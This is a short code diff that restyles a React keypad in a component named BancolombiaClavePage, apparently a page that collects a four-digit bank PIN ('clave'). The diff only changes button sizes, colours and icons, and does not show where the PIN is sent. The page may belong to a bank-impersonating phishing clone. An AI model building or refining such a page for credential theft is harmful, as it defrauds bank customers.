@@ -141,7 +141,7 @@ export default function BancolombiaClavePage() {
                 key={digit}
                 onClick={() => handleDigitClick(digit)}
                 disabled={loading || clave.length >= 4}
-                className="h-12 bg-gray-100 hover:bg-gray-200 rounded-lg text-xl font-semibold text-gray-800 disabled:opacity-50 transition"
+                className="h-14 bg-gray-50 hover:bg-gray-100 rounded-xl text-xl font-medium text-gray-700 disabled:opacity-50 transition border border-gray-200"
               >
                 {digit}
               </button>
@@ -149,23 +149,27 @@ export default function BancolombiaClavePage() {
             <button
               onClick={handleDelete}
               disabled={loading || clave.length === 0}
-              className="h-12 bg-red-100 hover:bg-red-200 rounded-lg text-red-600 font-semibold disabled:opacity-50 transition"
+              className="h-14 bg-pink-50 hover:bg-pink-100 rounded-xl text-pink-600 font-medium disabled:opacity-50 transition border border-pink-200 flex items-center justify-center"
             >
-              ←
+              <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M10 19l-7-7m0 0l7-7m-7 7h18" />
+              </svg>
             </button>
             <button
               onClick={() => handleDigitClick('0')}
               disabled={loading || clave.length >= 4}
-              className="h-12 bg-gray-100 hover:bg-gray-200 rounded-lg text-xl font-semibold text-gray-800 disabled:opacity-50 transition"
+              className="h-14 bg-gray-50 hover:bg-gray-100 rounded-xl text-xl font-medium text-gray-700 disabled:opacity-50 transition border border-gray-200"
             >
               0
             </button>
             <button
               onClick={handleSubmit}
               disabled={loading || clave.length !== 4}
-              className="h-12 bg-green-100 hover:bg-green-200 rounded-lg text-green-600 font-semibold disabled:opacity-50 transition"
+              className="h-14 bg-green-50 hover:bg-green-100 rounded-xl text-green-600 font-medium disabled:opacity-50 transition border border-green-200 flex items-center justify-center"
             >
-              ✓
+              <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" />
+              </svg>
             </button>
           </div>
 
